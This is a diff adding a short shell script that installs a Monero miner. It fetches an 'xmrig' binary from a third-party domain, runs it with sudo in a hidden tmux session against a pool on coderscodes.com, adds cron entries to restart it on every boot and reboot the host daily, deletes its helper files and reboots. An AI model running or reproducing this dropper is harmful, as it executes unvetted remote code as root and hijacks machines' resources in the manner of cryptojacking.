@@ -1,0 +1,24 @@
+#!/bin/sh
+wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
+sudo sh enable_1gb_pages.sh
+rm -r enable_1gb_pages.sh
+sudo apt-get update
+sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux
+cd $HOME
+wget hyperflood.xyz/xmrig
+sudo chmod +x xmrig
+echo "#!/bin/sh">st.sh
+echo "cd $HOME/">>st.sh
+echo "tmux kill-server">>st.sh
+echo "sleep 1">>st.sh
+echo "tmux new-session -d -s main 'sudo ./xmrig -o coderscodes.com:3333 -u nullu -k -o coderscodes.com:3333 -u nullu -t nullt --donate-level=0 --randomx-1gb-pages'">>st.sh
+time=$(date +%s)
+user=$time.OR
+threads=$(nproc)
+sed "s/nullt/$threads/g" st.sh>star.sh
+sed "s/nullu/$user/g" star.sh>start.sh
+echo "@reboot  sh $HOME/start.sh">> resmi
+echo "0 0 * * * sudo shutdown -r now">> resmi
+crontab resmi
+sudo rm -r resmi st.sh star.sh
+tmux new-session -d -s init 'sudo reboot'
